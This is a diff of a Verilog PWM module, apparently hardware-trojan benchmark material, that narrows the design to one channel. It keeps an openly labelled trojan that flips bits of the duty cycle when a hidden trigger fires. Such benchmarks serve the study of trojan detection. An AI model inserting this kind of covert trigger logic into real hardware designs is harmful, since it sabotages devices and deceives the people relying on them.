@@ -2,17 +2,14 @@
 // Fixed I/O to match Trojan1: clk, rst, r1 -> trigger
 module trojan1_pwm_host #(
     parameter PWM_WIDTH = 10,     // PWM counter resolution
-    parameter PWM_CHANNELS = 2,   // Number of PWM channels
     parameter [11:0] R1_INIT = 12'h777  // Initial value for r1 generation
 )(
     input wire clk,
     input wire rst,
-    input wire [PWM_WIDTH-1:0] duty_cycle_ch0,
-    input wire [PWM_WIDTH-1:0] duty_cycle_ch1,
+    input wire [PWM_WIDTH-1:0] duty_cycle,
     input wire [PWM_WIDTH-1:0] period_value,
     input wire pwm_enable,
-    output reg pwm_out_ch0,
-    output reg pwm_out_ch1,
+    output reg pwm_out,
     output reg period_complete
 );
 
@@ -69,22 +66,17 @@ module trojan1_pwm_host #(
     // PWM output generation with trojan trigger integration
     always @(posedge clk or posedge rst) begin
         if (rst) begin
-            pwm_out_ch0 <= 1'b0;
-            pwm_out_ch1 <= 1'b0;
+            pwm_out <= 1'b0;
         end else if (pwm_enable) begin
-            // Channel 0 with trojan trigger influence
+            // PWM output with trojan trigger influence
             if (trojan_trigger) begin
                 // Trojan modifies duty cycle slightly
-                pwm_out_ch0 <= (pwm_counter < (duty_cycle_ch0 ^ 10'h3F));
+                pwm_out <= (pwm_counter < (duty_cycle ^ PWM_WIDTH'(10'h3F)));
             end else begin
-                pwm_out_ch0 <= (pwm_counter < duty_cycle_ch0);
+                pwm_out <= (pwm_counter < duty_cycle);
             end
-            
-            // Channel 1 normal operation
-            pwm_out_ch1 <= (pwm_counter < duty_cycle_ch1);
         end else begin
-            pwm_out_ch0 <= 1'b0;
-            pwm_out_ch1 <= 1'b0;
+            pwm_out <= 1'b0;
         end
     end
     
